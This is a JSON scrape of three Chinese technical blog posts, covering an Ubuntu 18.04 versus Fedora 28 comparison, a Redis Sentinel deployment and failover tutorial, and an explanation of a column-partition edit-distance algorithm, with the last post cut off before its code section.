[{"title": "对比 Ubuntu 18.04 和 Fedora 28", "url": "http://blog.jobbole.com/114327/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/ddb1f665d74f913109feb4dfead998f1.jpg"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,8,/,2,7, ,·", "content": "原文出处：Linuxandubuntu译文出处：Linux中国/AndySong大家好，我准备在今天突出说明一下两大主流Linux发行版，即Ubuntu18.04和Fedora28，包括一些特性和差异。两者都有各自的包管理系统，其中Ubuntu使用DEB，Fedora使用RPM；但二者使用同样的桌面环境DesktopEnvironment（DE）GNOME，并致力于为Linux用户提供高品质的桌面体验desktopexperience。Ubuntu18.04是Ubuntu目前最新的长期支持版本LongTermSupport（LTS），为用户提供GNOME桌面系统。Fedora28也提供GNOME桌面系统，但落实到具体的软件包管理方面，二者的桌面体验存在差异；在用户界面UserInterfaces方面也显然存在差异。基本概念不知你是否了解，虽然Ubuntu基于Debian，但Ubuntu比Debian更早提供最新版本的软件。举个例子，当Ubuntu提供流行网页浏览器FirefoxQuantum时，Debian仍在提供Firefox的延期支持版ExtendedSupportRelease（ESR）。（LCTT译注：从2012年1月开始，Firefox进入快速版本期，每6周发布新的主线版本，每隔7个主线版本发布新的ESR版本。Firefox57的桌面版发布时被命名为FirefoxQuantum，同期的ESR版本与Firefox52一同发布并基于Firefox48。参考Wiki:History_of_Firefox）同样的情况也适用于Fedora，它为终端用户提供前沿的软件，也被用作下一个稳定版本的RHEL(RedHatEnterpriseLinux)的测试平台。桌面预览Fedora提供原汁原味的vanillaGNOME桌面体验；相比之下，Ubuntu18.04对GNOME做了若干方面的微调，以便长期以来的Unity用户可以平滑的过渡到GNOME桌面环境。为节省开发时间，Canonical（从Ubuntu17.10开始）已经决定放弃Unity并转向GNOME桌面，以便可以将更多精力投入到IoT领域。因此，在Fedora的桌面预览中，我们可以看到一个简洁的无图标桌面和一个自动隐藏的侧边栏，整体外观采用GNOME默认的Adwaita主题。相比之下，Ubuntu采用其经典的有图标桌面样式，左侧边栏用于模拟其传统的“程序坞dock”，使用UbuntuAmbiance主题定制化窗口，与其传统的（Unity桌面）外观和体验基本一致。虽然存在一定差异，但习惯使用其中一种桌面环境后切换到另外一种并不困难。毕竟二者设计时都充分考虑了简洁性和用户友好性，即使是新用户也不会对这两种Linux发行版感到不适应。但外观或UI并不是决定用户选择哪一种Linux发行版的唯一因素，还有其它因素也会影响用户的选择。下面主要介绍两种Linux发行版在软件包管理相关方面的内容。软件中心Ubuntu使用dpkg（即DebianPackageManagement）将软件分发给终端用户；Fedora则使用rpm（全称为RedHatPackageManagement）。它们都是Linux社区中非常流行的包管理系统，对应的命令行工具也都简单易用。但在具体分发的软件方面，各个Linux发行版会有明显差异。Canonical每6个月发布新版本的Ubuntu，一般是在每年的4月和10月。对每个版本，开发者会维护一个开发计划；Ubuntu新版本发布后，该版本就会进入冻结freeze状态，即停止新软件的开发和测试。相比之下，Fedora也采用相似的6个月发布周期，看起来很像一种滚动更新rollingrelease的Linux发行版（其实并不是这样）。与Ubuntu不同之处在于，（Fedora中的）几乎所有软件包更新都很频繁，让用户有机会尝试最新版本的软件。但这样也导致软件Bug更频繁出现，给用户带来“不稳定性”，虽然还不至于导致系统不可用。软件更新我上面已经提到了Ubuntu版本的冻结状态。好吧，由于它对Ubuntu软件更新方式有着重要的影响，我再次提到这个状态：当Ubuntu新版本发布后，该版本的开发（这里是指测试新软件）就停止了。即将发布的下个版本的开发也随之开始，先后历经“每日构建dailybuild”和“测试版betarelease”阶段，最后作为新版本发布给终端用户。在冻结状态下，Ubuntu维护者不会在软件源packagerepository中增加最新版软件，除非用于解决严重的安全问题。因此，Ubuntu用户可用的软件更新更多涉及Bug修复而不是新特性，这样的好处在于系统可以保持稳定，不会扰乱用户的使用。Fedora试图为终端用户提供最新版本的软件，故用户的可用软件更新相比Ubuntu而言会更多涉及新特性。当然，开发者为了维持系统的稳定性，也采取了一系列措施。例如，在操作系统启动时，用户可以从最多三个可用内核workingkernel（最新内核处于最上方）中进行选择；当新内核无法启动时，用户可以回滚使用之前两个可用内核。Snaps和flatpak它们都是新出现的酷炫工具，可以将软件发布到多个Linux发行版上。Ubuntu提供snaps，而Fedora则提供flatpak。二者之中snaps更加流行，更多流行软件或版权软件都在考虑上架snap商店。Flatpak也在吸引关注，越来越多的软件上线该平台。不幸的是，由于二者出现的时间都不久，很多人遇到“窗口主题不一致windowtheme-breaking”问题并在网上表达不满。但由于二者都很易于使用，在二者之间切换并不是难事。（LCTT译注：按译者理解，由于二者都增加了一层安全隔离，读取系统主题方面会遇到问题；另外，似乎也有反馈snap专用主题无法及时应用于snap的问题）应用对比下面列出一些在Ubuntu和Fedora上共有的常见应用，然后在两个平台之间进行对比：计算器Fedora上的计算器程序启动速度更快。这是因为Fedora上的计算器程序是软件包形式安装的，而Ubuntu上的计算器程序则是snap版本。系统监视器可能听上去比较书呆子气，但我认为观察计算机性能并杀掉令人讨厌的进程是必要且直观的。程序启动速度对比与计算器的结果一致，即（软件包方式安装的）Fedora版本快于（snap形式提供的）Ubuntu版本。帮助程序我已经提到，（为便于长期以来的Untiy用户平滑切换到GNOME），Ubuntu提供的GNOME桌面环境是经过微调的版本。不幸的是，Ubuntu开发者似乎忘记或忽略了对帮助程序的更新，用户阅读文档（入门视频）后会发现演示视频与真实环境有略微差异，这可能让人感到迷惑。结论Ubuntu和Fedora是两个主流的Linux发行版。两者都各自有一些华而不实的特性，因而新接触Linux的人很难抉择。我的建议是同时尝试二者，这样你在试用后可以发现哪个发行版提供的工具更适合你。希望你阅读愉快，你可以在下方的评论区给出我漏掉的内容或你的建议。1赞1收藏评论", "url_object_id": "ef6e75a95b9067935c1a0f11772b2c0c"},{"title": "深入学习 Redis（4）：哨兵", "url": "http://blog.jobbole.com/114382/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "praise_nums": 1, "fav_nums": 0, "comments_nums": 0, "tags": "2,0,1,8,/,0,9,/,1,3, ,·", "content": "原文出处：编程迷思前言在深入学习Redis（3）：主从复制中曾提到，Redis主从复制的作用有数据热备、负载均衡、故障恢复等；但主从复制存在的一个问题是故障恢复无法自动化。本文将要介绍的哨兵，它基于Redis主从复制，主要作用便是解决主节点故障恢复的自动化问题，进一步提高系统的高可用性。文章主要内容如下：首先介绍哨兵的作用和架构；然后讲述哨兵系统的部署方法，以及通过客户端访问哨兵系统的方法；然后简要说明哨兵实现的基本原理；最后给出关于哨兵实践的一些建议。文章内容基于Redis3.0版本。系列文章深入学习Redis（1）：Redis内存模型深入学习Redis（2）：持久化深入学习Redis（3）：主从复制一、作用和架构1.作用在介绍哨兵之前，首先从宏观角度回顾一下Redis实现高可用相关的技术。它们包括：持久化、复制、哨兵和集群，其主要作用和解决的问题是：持久化：持久化是最简单的高可用方法(有时甚至不被归为高可用的手段)，主要作用是数据备份，即将数据存储在硬盘，保证数据不会因进程退出而丢失。复制：复制是高可用Redis的基础，哨兵和集群都是在复制基础上实现高可用的。复制主要实现了数据的多机备份，以及对于读操作的负载均衡和简单的故障恢复。缺陷：故障恢复无法自动化；写操作无法负载均衡；存储能力受到单机的限制。哨兵：在复制的基础上，哨兵实现了自动化的故障恢复。缺陷：写操作无法负载均衡；存储能力受到单机的限制。集群：通过集群，Redis解决了写操作无法负载均衡，以及存储能力受到单机限制的问题，实现了较为完善的高可用方案。下面说回哨兵。RedisSentinel，即Redis哨兵，在Redis2.8版本开始引入。哨兵的核心功能是主节点的自动故障转移。下面是Redis官方文档对于哨兵功能的描述：监控（Monitoring）：哨兵会不断地检查主节点和从节点是否运作正常。自动故障转移（Automaticfailover）：当主节点不能正常工作时，哨兵会开始自动故障转移操作，它会将失效主节点的其中一个从节点升级为新的主节点，并让其他从节点改为复制新的主节点。配置提供者（Configurationprovider）：客户端在初始化时，通过连接哨兵来获得当前Redis服务的主节点地址。通知（Notification）：哨兵可以将故障转移的结果发送给客户端。其中，监控和自动故障转移功能，使得哨兵可以及时发现主节点故障并完成转移；而配置提供者和通知功能，则需要在与客户端的交互中才能体现。这里对“客户端”一词在文章中的用法做一个说明：在前面的文章中，只要通过API访问redis服务器，都会称作客户端，包括redis-cli、Java客户端Jedis等；为了便于区分说明，本文中的客户端并不包括redis-cli，而是比redis-cli更加复杂：redis-cli使用的是redis提供的底层接口，而客户端则对这些接口、功能进行了封装，以便充分利用哨兵的配置提供者和通知功能。2.架构典型的哨兵架构图如下所示：它由两部分组成，哨兵节点和数据节点：哨兵节点：哨兵系统由一个或多个哨兵节点组成，哨兵节点是特殊的redis节点，不存储数据。数据节点：主节点和从节点都是数据节点。二、部署这一部分将部署一个简单的哨兵系统，包含1个主节点、2个从节点和3个哨兵节点。方便起见：所有这些节点都部署在一台机器上（局域网IP：192.168.92.128），使用端口号区分；节点的配置尽可能简化。1.部署主从节点哨兵系统中的主从节点，与普通的主从节点配置是一样的，并不需要做任何额外配置。下面分别是主节点（port=6379）和2个从节点（port=6380/6381）的配置文件，配置都比较简单，不再详述。#redis-6379.confport6379daemonizeyeslogfile\"6379.log\"dbfilename\"dump-6379.rdb\"#redis-6380.confport6380daemonizeyeslogfile\"6380.log\"dbfilename\"dump-6380.rdb\"slaveof192.168.92.1286379#redis-6381.confport6381daemonizeyeslogfile\"6381.log\"dbfilename\"dump-6381.rdb\"slaveof192.168.92.128637912345678910111213141516171819#redis-6379.confport6379daemonizeyeslogfile\"6379.log\"dbfilename\"dump-6379.rdb\"#redis-6380.confport6380daemonizeyeslogfile\"6380.log\"dbfilename\"dump-6380.rdb\"slaveof192.168.92.1286379#redis-6381.confport6381daemonizeyeslogfile\"6381.log\"dbfilename\"dump-6381.rdb\"slaveof192.168.92.1286379配置完成后，依次启动主节点和从节点：redis-serverredis-6379.confredis-serverredis-6380.confredis-serverredis-6381.conf123redis-serverredis-6379.confredis-serverredis-6380.confredis-serverredis-6381.conf节点启动后，连接主节点查看主从状态是否正常，如下图所示：2.部署哨兵节点哨兵节点本质上是特殊的Redis节点。3个哨兵节点的配置几乎是完全一样的，主要区别在于端口号的不同（26379/26380/26381），下面以26379节点为例介绍节点的配置和启动方式；配置部分尽量简化，更多配置会在后面介绍。#sentinel-26379.confport26379daemonizeyeslogfile\"26379.log\"sentinelmonitormymaster192.168.92.1286379212345#sentinel-26379.confport26379daemonizeyeslogfile\"26379.log\"sentinelmonitormymaster192.168.92.12863792其中，sentinelmonitormymaster192.168.92.12863792配置的含义是：该哨兵节点监控192.168.92.128:6379这个主节点，该主节点的名称是mymaster，最后的2的含义与主节点的故障判定有关：至少需要2个哨兵节点同意，才能判定主节点故障并进行故障转移。哨兵节点的启动有两种方式，二者作用是完全相同的：redis-sentinelsentinel-26379.confredis-serversentinel-26379.conf--sentinel12redis-sentinelsentinel-26379.confredis-serversentinel-26379.conf--sentinel按照上述方式配置和启动之后，整个哨兵系统就启动完毕了。可以通过redis-cli连接哨兵节点进行验证，如下图所示：可以看出26379哨兵节点已经在监控mymaster主节点(即192.168.92.128:6379)，并发现了其2个从节点和另外2个哨兵节点。此时如果查看哨兵节点的配置文件，会发现一些变化，以26379为例：其中，dir只是显式声明了数据和日志所在的目录（在哨兵语境下只有日志）；known-slave和known-sentinel显示哨兵已经发现了从节点和其他哨兵；带有epoch的参数与配置纪元有关（配置纪元是一个从0开始的计数器，每进行一次领导者哨兵选举，都会+1；领导者哨兵选举是故障转移阶段的一个操作，在后文原理部分会介绍）。3.演示故障转移哨兵的4个作用中，配置提供者和通知需要客户端的配合，本文将在下一章介绍客户端访问哨兵系统的方法时详细介绍。这一小节将演示当主节点发生故障时，哨兵的监控和自动故障转移功能。（1）首先，使用kill命令杀掉主节点：（2）如果此时立即在哨兵节点中使用infoSentinel命令查看，会发现主节点还没有切换过来，因为哨兵发现主节点故障并转移，需要一段时间。（3）一段时间以后，再次在哨兵节点中执行infoSentinel查看，发现主节点已经切换成6380节点。但是同时可以发现，哨兵节点认为新的主节点仍然有2个从节点，这是因为哨兵在将6380切换成主节点的同时，将6379节点置为其从节点；虽然6379从节点已经挂掉，但是由于哨兵并不会对从节点进行客观下线（其含义将在原理部分介绍），因此认为该从节点一直存在。当6379节点重新启动后，会自动变成6380节点的从节点。下面验证一下。（4）重启6379节点：可以看到6379节点成为了6380节点的从节点。（5）在故障转移阶段，哨兵和主从节点的配置文件都会被改写。对于主从节点，主要是slaveof配置的变化：新的主节点没有了slaveof配置，其从节点则slaveof新的主节点。对于哨兵节点，除了主从节点信息的变化，纪元(epoch)也会变化，下图中可以看到纪元相关的参数都+1了。4.总结哨兵系统的搭建过程，有几点需要注意：（1）哨兵系统中的主从节点，与普通的主从节点并没有什么区别，故障发现和转移是由哨兵来控制和完成的。（2）哨兵节点本质上是redis节点。（3）每个哨兵节点，只需要配置监控主节点，便可以自动发现其他的哨兵节点和从节点。（4）在哨兵节点启动和故障转移阶段，各个节点的配置文件会被重写(configrewrite)。（5）本章的例子中，一个哨兵只监控了一个主节点；实际上，一个哨兵可以监控多个主节点，通过配置多条sentinelmonitor即可实现。三、客户端访问哨兵系统上一小节演示了哨兵的两大作用：监控和自动故障转移，本小节则结合客户端演示哨兵的另外两个作用：配置提供者和通知。1.代码示例在介绍客户端的原理之前，先以Java客户端Jedis为例，演示一下使用方法：下面代码可以连接我们刚刚搭建的哨兵系统，并进行各种读写操作（代码中只演示如何连接哨兵，异常处理、资源关闭等未考虑）。publicstaticvoidtestSentinel()throwsException{StringmasterName=\"mymaster\";Set&lt;String&gt;sentinels=newHashSet&lt;&gt;();sentinels.add(\"192.168.92.128:26379\");sentinels.add(\"192.168.92.128:26380\");sentinels.add(\"192.168.92.128:26381\");JedisSentinelPoolpool=newJedisSentinelPool(masterName,sentinels);//初始化过程做了很多工作Jedisjedis=pool.getResource();jedis.set(\"key1\",\"value1\");pool.close();}123456789101112publicstaticvoidtestSentinel()throwsException{StringmasterName=\"mymaster\";Set&lt;String&gt;sentinels=newHashSet&lt;&gt;();sentinels.add(\"192.168.92.128:26379\");sentinels.add(\"192.168.92.128:26380\");sentinels.add(\"192.168.92.128:26381\");JedisSentinelPoolpool=newJedisSentinelPool(masterName,sentinels);//初始化过程做了很多工作Jedisjedis=pool.getResource();jedis.set(\"key1\",\"value1\");pool.close();}2.客户端原理Jedis客户端对哨兵提供了很好的支持。如上述代码所示，我们只需要向Jedis提供哨兵节点集合和masterName，构造JedisSentinelPool对象；然后便可以像使用普通redis连接池一样来使用了：通过pool.getResource()获取连接，执行具体的命令。在整个过程中，我们的代码不需要显式的指定主节点的地址，就可以连接到主节点；代码中对故障转移没有任何体现，就可以在哨兵完成故障转移后自动的切换主节点。之所以可以做到这一点，是因为在JedisSentinelPool的构造器中，进行了相关的工作；主要包括以下两点：（1）遍历哨兵节点，获取主节点信息：遍历哨兵节点，通过其中一个哨兵节点+masterName获得主节点的信息；该功能是通过调用哨兵节点的sentinelget-master-addr-by-name命令实现，该命令示例如下：一旦获得主节点信息，停止遍历（因此一般来说遍历到第一个哨兵节点，循环就停止了）。（2）增加对哨兵的监听：这样当发生故障转移时，客户端便可以收到哨兵的通知，从而完成主节点的切换。具体做法是：利用redis提供的发布订阅功能，为每一个哨兵节点开启一个单独的线程，订阅哨兵节点的+switch-master频道，当收到消息时，重新初始化连接池。3.总结通过客户端原理的介绍，可以加深对哨兵功能的理解：（1）配置提供者：客户端可以通过哨兵节点+masterName获取主节点信息，在这里哨兵起到的作用就是配置提供者。需要注意的是，哨兵只是配置提供者，而不是代理。二者的区别在于：如果是配置提供者，客户端在通过哨兵获得主节点信息后，会直接建立到主节点的连接，后续的请求(如set/get)会直接发向主节点；如果是代理，客户端的每一次请求都会发向哨兵，哨兵再通过主节点处理请求。举一个例子可以很好的理解哨兵的作用是配置提供者，而不是代理。在前面部署的哨兵系统中，将哨兵节点的配置文件进行如下修改：sentinelmonitormymaster192.168.92.12863792改为sentinelmonitormymaster127.0.0.163792123sentinelmonitormymaster192.168.92.12863792改为sentinelmonitormymaster127.0.0.163792然后，将前述客户端代码在局域网的另外一台机器上运行，会发现客户端无法连接主节点；这是因为哨兵作为配置提供者，客户端通过它查询到主节点的地址为127.0.0.1:6379，客户端会向127.0.0.1:6379建立redis连接，自然无法连接。如果哨兵是代理，这个问题就不会出现了。（2）通知：哨兵节点在故障转移完成后，会将新的主节点信息发送给客户端，以便客户端及时切换主节点。四、基本原理前面介绍了哨兵部署、使用的基本方法，本部分介绍哨兵实现的基本原理。1.哨兵节点支持的命令哨兵节点作为运行在特殊模式下的redis节点，其支持的命令与普通的redis节点不同。在运维中，我们可以通过这些命令查询或修改哨兵系统；不过更重要的是，哨兵系统要实现故障发现、故障转移等各种功能，离不开哨兵节点之间的通信，而通信的很大一部分是通过哨兵节点支持的命令来实现的。下面介绍哨兵节点支持的主要命令。（1）基础查询：通过这些命令，可以查询哨兵系统的拓扑结构、节点信息、配置信息等。infosentinel：获取监控的所有主节点的基本信息sentinelmasters：获取监控的所有主节点的详细信息sentinelmastermymaster：获取监控的主节点mymaster的详细信息sentinelslavesmymaster：获取监控的主节点mymaster的从节点的详细信息sentinelsentinelsmymaster：获取监控的主节点mymaster的哨兵节点的详细信息sentinelget-master-addr-by-namemymaster：获取监控的主节点mymaster的地址信息，前文已有介绍sentinelis-master-down-by-addr：哨兵节点之间可以通过该命令询问主节点是否下线，从而对是否客观下线做出判断（2）增加/移除对主节点的监控sentinelmonitormymaster2192.168.92.128163792：与部署哨兵节点时配置文件中的sentinelmonitor功能完全一样，不再详述sentinelremovemymaster2：取消当前哨兵节点对主节点mymaster2的监控（3）强制故障转移sentinelfailovermymaster：该命令可以强制对mymaster执行故障转移，即便当前的主节点运行完好；例如，如果当前主节点所在机器即将报废，便可以提前通过failover命令进行故障转移。2.基本原理关于哨兵的原理，关键是了解以下几个概念。（1）定时任务：每个哨兵节点维护了3个定时任务。定时任务的功能分别如下：通过向主从节点发送info命令获取最新的主从结构；通过发布订阅功能获取其他哨兵节点的信息；通过向其他节点发送ping命令进行心跳检测，判断是否下线。（2）主观下线：在心跳检测的定时任务中，如果其他节点超过一定时间没有回复，哨兵节点就会将其进行主观下线。顾名思义，主观下线的意思是一个哨兵节点“主观地”判断下线；与主观下线相对应的是客观下线。（3）客观下线：哨兵节点在对主节点进行主观下线后，会通过sentinelis-master-down-by-addr命令询问其他哨兵节点该主节点的状态；如果判断主节点下线的哨兵数量达到一定数值，则对该主节点进行客观下线。需要特别注意的是，客观下线是主节点才有的概念；如果从节点和哨兵节点发生故障，被哨兵主观下线后，不会再有后续的客观下线和故障转移操作。（4）选举领导者哨兵节点：当主节点被判断客观下线以后，各个哨兵节点会进行协商，选举出一个领导者哨兵节点，并由该领导者节点对其进行故障转移操作。监视该主节点的所有哨兵都有可能被选为领导者，选举使用的算法是Raft算法；Raft算法的基本思路是先到先得：即在一轮选举中，哨兵A向B发送成为领导者的申请，如果B没有同意过其他哨兵，则会同意A成为领导者。选举的具体过程这里不做详细描述，一般来说，哨兵选择的过程很快，谁先完成客观下线，一般就能成为领导者。（5）故障转移：选举出的领导者哨兵，开始进行故障转移操作，该操作大体可以分为3个步骤：在从节点中选择新的主节点：选择的原则是，首先过滤掉不健康的从节点；然后选择优先级最高的从节点(由slave-priority指定)；如果优先级无法区分，则选择复制偏移量最大的从节点；如果仍无法区分，则选择runid最小的从节点。更新主从状态：通过slaveofnoone命令，让选出来的从节点成为主节点；并通过slaveof命令让其他节点成为其从节点。将已经下线的主节点(即6379)设置为新的主节点的从节点，当6379重新上线后，它会成为新的主节点的从节点。通过上述几个关键概念，可以基本了解哨兵的工作原理。为了更形象的说明，下图展示了领导者哨兵节点的日志，包括从节点启动到完成故障转移。五、配置与实践建议1.配置下面介绍与哨兵相关的几个配置。（1）sentinelmonitor{masterName}{masterIp}{masterPort}{quorum}sentinelmonitor是哨兵最核心的配置，在前文讲述部署哨兵节点时已说明，其中：masterName指定了主节点名称，masterIp和masterPort指定了主节点地址，quorum是判断主节点客观下线的哨兵数量阈值：当判定主节点下线的哨兵数量达到quorum时，对主节点进行客观下线。建议取值为哨兵数量的一半加1。（2）sentineldown-after-milliseconds{masterName}{time}sentineldown-after-milliseconds与主观下线的判断有关：哨兵使用ping命令对其他节点进行心跳检测，如果其他节点超过down-after-milliseconds配置的时间没有回复，哨兵就会将其进行主观下线。该配置对主节点、从节点和哨兵节点的主观下线判定都有效。down-after-milliseconds的默认值是30000，即30s；可以根据不同的网络环境和应用要求来调整：值越大，对主观下线的判定会越宽松，好处是误判的可能性小，坏处是故障发现和故障转移的时间变长，客户端等待的时间也会变长。例如，如果应用对可用性要求较高，则可以将值适当调小，当故障发生时尽快完成转移；如果网络环境相对较差，可以适当提高该阈值，避免频繁误判。（3）sentinelparallel-syncs{masterName}{number}sentinelparallel-syncs与故障转移之后从节点的复制有关：它规定了每次向新的主节点发起复制操作的从节点个数。例如，假设主节点切换完成之后，有3个从节点要向新的主节点发起复制；如果parallel-syncs=1，则从节点会一个一个开始复制；如果parallel-syncs=3，则3个从节点会一起开始复制。parallel-syncs取值越大，从节点完成复制的时间越快，但是对主节点的网络负载、硬盘负载造成的压力也越大；应根据实际情况设置。例如，如果主节点的负载较低，而从节点对服务可用的要求较高，可以适量增加parallel-syncs取值。parallel-syncs的默认值是1。（4）sentinelfailover-timeout{masterName}{time}sentinelfailover-timeout与故障转移超时的判断有关，但是该参数不是用来判断整个故障转移阶段的超时，而是其几个子阶段的超时，例如如果主节点晋升从节点时间超过timeout，或从节点向新的主节点发起复制操作的时间(不包括复制数据的时间)超过timeout，都会导致故障转移超时失败。failover-timeout的默认值是180000，即180s；如果超时，则下一次该值会变为原来的2倍。（5）除上述几个参数外，还有一些其他参数，如安全验证相关的参数，这里不做介绍。2.实践建议（1）哨兵节点的数量应不止一个，一方面增加哨兵节点的冗余，避免哨兵本身成为高可用的瓶颈；另一方面减少对下线的误判。此外，这些不同的哨兵节点应部署在不同的物理机上。（2）哨兵节点的数量应该是奇数，便于哨兵通过投票做出“决策”：领导者选举的决策、客观下线的决策等。（3）各个哨兵节点的配置应一致，包括硬件、参数等；此外，所有节点都应该使用ntp或类似服务，保证时间准确、一致。（4）哨兵的配置提供者和通知客户端功能，需要客户端的支持才能实现，如前文所说的Jedis；如果开发者使用的库未提供相应支持，则可能需要开发者自己实现。（5）当哨兵系统中的节点在docker（或其他可能进行端口映射的软件）中部署时，应特别注意端口映射可能会导致哨兵系统无法正常工作，因为哨兵的工作基于与其他节点的通信，而docker的端口映射可能导致哨兵无法连接到其他节点。例如，哨兵之间互相发现，依赖于它们对外宣称的IP和port，如果某个哨兵A部署在做了端口映射的docker中，那么其他哨兵使用A宣称的port无法连接到A。六、总结本文首先介绍了哨兵的作用：监控、故障转移、配置提供者和通知；然后讲述了哨兵系统的部署方法，以及通过客户端访问哨兵系统的方法；再然后简要说明了哨兵实现的基本原理；最后给出了关于哨兵实践的一些建议。在主从复制的基础上，哨兵引入了主节点的自动故障转移，进一步提高了Redis的高可用性；但是哨兵的缺陷同样很明显：哨兵无法对从节点进行自动故障转移，在读写分离场景下，从节点故障会导致读服务不可用，需要我们对从节点做额外的监控、切换操作。此外，哨兵仍然没有解决写操作无法负载均衡、及存储能力受到单机限制的问题；这些问题的解决需要使用集群，我将在后面的文章中介绍，欢迎关注。参考文献https://redis.io/topics/sentinelhttp://www.redis.cn/《Redis开发与运维》《Redis设计与实现》1赞收藏评论", "url_object_id": "3241c8714d76296e3d9a75803c871f8c"},{"title": "死磕一周算法，我让服务性能提高50%", "url": "http://blog.jobbole.com/114324/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/10/9184208f96827c412ab7d3570590ef76.jpg"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,8,/,2,7, ,·", "content": "原文出处：haolujun前言我最近一直在公司做检索性能优化。当我看到这个算法之前，我也不认为我负责的检索系统性能还有改进的余地。但是这个算法确实太牛掰了，足足让服务性能提高50%，我不得不和大家分享一下。其实前一段时间的博客中也写到过这个算法，只是没有细讲，今天我准备把它单独拎出来，说道说道。说实话，本人数学功底一般，算法证明不是我强项，所以文中的证明只是我在论文作者的基础上加入了自己的思考方法，并且还没有完全证明出来，请大家见谅!欢迎爱思考的小伙伴进行补充。我只要达到抛砖引玉的作用，就知足了。回归正题，我们的检索服务中用到了最小编辑距离算法，这个算法本身是平方量级的时间复杂度，并且很少人在帖子中提到小于这个复杂度的算法。但是我无意中发现了另外一个更牛的算法：列划分算法，使得这个本就很牛的算法性能直接提高一倍。接下来进入正题。列划分算法这个算法比较难理解，出自如下论文：《Theoreticalandempiricalcomparisonsofapproximatestringmatchingalgorithms》。InProceedingsofthe3rdAnnualSymposiumonCombinatorialPatternMatching,number664inLectureNotesinComputerScience,pages175~184.Springer-Verlag,1992。Author:WIChang，JLampe。所以有必要先给大家普及一些共识。编辑矩阵最小编辑距离在计算过程中使用动态规划算法计算的那个矩阵，了解这个算法的都懂，我不赘述。但是我们的编辑矩阵有个特点：第一行都是0，这么做的好处是：只要文本串T中的任意一个子序列与模式串P的编辑距离小于某个固定的数值，就会被发现。给大伙一个样例，文本串T=annealing，模式串P=annual：注意，第一行都是0，这是与传统最小编辑距离的最大区别，其余的动归方程完全相同。对角线法则编辑矩阵沿着右下方对角线方向数值非递减，并且至多相差1。行列法则每行每列相邻两个数至多相差1。观察编辑距离矩阵，我们发现如下事实：每一列是由若干段连续数字组成。所以我们把编辑矩阵的每一列划分成若干连续序列，如下图所示：红色框中就是一个一个的序列，序列内部连续。序列-δ定义对于编辑矩阵的每一个元素D[j][i](j是行，i是列)，若j–D[j][i]=δ，我们就说D[j][i]属于i列上的序列-δ，我们还观察到随着j增大，j–D[j][i]是非递减的。如下图所示：序列-δ终止位置每个序列都会有起始和终止位置。序列-δ的终止位置为j，如果j是序列-δ的最小横坐标，并且满足D[j+1][i]属于序列-ε，并且ε&gt;δ（即j+1-D[j+1][i]&gt;δ）。长度为0的序列我们发现如果按照如上定义，每一列上δ的值并不一定连续，总是或有或无的缺少一个数值。所以我们定义长度为0的序列：当D[j+1][i]&lt;D[j][i]时，我们就在序列-δ和序列-(δ+2)之间人为插入一个长度为0的序列-(δ+1)。如下图所示：所以，我们按照这个定义，就可以对编辑矩阵的每列进行一个划分，划分的每一段都是一串连续数字。说了这么多，这个定义有什么用呢？假若，我们每次都能根据前一列的列划分情况直接推导出后一列的列划分情况，那么就可以省去好多计算，毕竟每一个划分中的每一段的数字都是连续的，这就暗示我们可以直接用一个常数时间的加法直接得到某一个编辑矩阵的元素值，而不用使用最小编辑距离的动态规划算法去计算。接下来的重点来了，我们介绍这个推导公式，请打起十二分精神！我们按照序列-δ长度是否为0来介绍这个推论。由于其中一个推论文字描述太繁琐，不容易理解，所以我画了个图：接下来烧脑开始。推论1：如果列i上长度为0的序列-δ的结束位置为j，则列i+1上的序列-δ的结束位置为j+1。证明：由推论前提我们知道δ=j–D[j][i]+1（想想前面说的δ值不连续，我们就人为插入一个中间值，只不过长度为0）。我们观察编辑矩阵就会发现如下两个事实：事实1：D[j+1][i+1]=D[j][i]（别问为什么，自己观察，看看是不是都这样，其实可以用反证法，我们就不证明了）。事实2：D[j+2][i+1]&lt;=D[j][i]。通过事实1，我们知道D[j+1][i+1]确实属于序列-δ，因为j+1–D[j+1][i+1]=j+1–D[j][i]=δ。通过事实2，我们知道列i+1上的序列δ，终止位置为j+1。所以推论1证明结束。推论2：文字描述略，请看图证明：设这个序列长度为L，除了每列的第一个序列外，其余序列的其余位置均是当前的编辑距离小于等于该列上一个位置的编辑距离：即D[j-L+1][i]&lt;=D[j-L][i]，所以，我们可以推出：D[j-L+1][i]&lt;=D[j-L][i];再根据编辑矩阵对角线非递减我们知道，D[j-L+1][i+1]&gt;=D[j-L][i];综上两点我们得到如下大小关系：D[j-L+1][i+1]&gt;=D[j-L+1][i]。此外我们知道我们当前列的序列-δ截止位置为j，也意味着D[j+1][i]&lt;=D[j][i]，同样根据对角线法则，我们得出D[j+2][i+1]&lt;=D[j+1][i]+1&lt;=D[j][i]+1。接下来到了最精彩的一步，我们知道列i当前序列-δ内的值是连续的，如果起始编辑距离为A，那么终止编辑距离为A+L-1。而由我们的推导可以发现：D[j-L+1][i+1]&gt;=A，D[j+2][i+1]&lt;=(A+L-1)+1=A+L，而之间跨越的长度为(j+2)-(j-L+1)+1=L+2。我们可以推出列i+1上从行j-L+1到行j+2之间的序列一定不连续，否则D[j+2][i+1]&gt;=A+L+2-1=A+L+1，与我们先前的推导矛盾。所以，在j-L+1和j+2之间一定有一个列终止，这样才能消去一个序号。此外我们还有一个疑问，列i+1上的序列-δ结束位置一定在j-L+1和j+1之间么？我们要证明这个事。证明：因为δ=j-D[j][i]=j-L+1-D[j-L+1][i]&gt;=j-L+1-D[j-L+1][i+1]，即列i+1上的序列-δ的结束位置一定在j-L+1或者之后；由于j+1-D[j+1][i]&gt;δ，根据对角线法则D[j+2][i+1]&lt;=D[j+1][i]+1，有j+2-D[j+2][i+1]&gt;=j+2-(D[j+1][i]+1)=j+1-D[j+1][i]&gt;δ，固列i+1上的序列-δ的终止位置一定在j+2之前，即j-L+1到j+1之间。后面推论2的分情况讨论，我一个也没证明出来，作者在论文中轻飘飘的一句话“后面很好证明，他就不去证明了”，但是却消耗了我所有脑细胞。所以，如果哪位小伙伴把推论2剩下的内容证明出来了，欢迎给我留言，我也学习学习。这个算法的时间复杂度是多少呢？作者用启发式的方法证明了算法的复杂度约为$O(mn/sqrt[2]{b})$，其中b是字符集大小。代码实现接下来说一下代码实现，给出我总结出来